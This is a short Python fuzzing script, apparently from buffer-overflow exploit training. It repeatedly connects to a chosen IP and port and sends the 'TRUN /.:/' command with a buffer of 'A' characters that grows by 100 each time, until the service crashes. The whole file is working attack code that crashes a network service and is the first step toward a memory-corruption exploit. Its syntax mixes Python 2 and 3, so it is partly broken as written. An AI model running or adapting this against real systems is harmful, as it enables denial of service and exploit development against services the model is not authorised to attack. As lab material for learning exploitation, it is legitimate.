#!/usr/bin/python

import sys,socket

from time import sleep

target_ip = str(input("Enter the IP: "))

target_port = int(input("Enter the port: "))

buffer = "A" * 100

while True:
	try: 
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((target_ip,target_port))
		
		s.send(("TRUN /.:/" + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100
		
	except:
		
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()
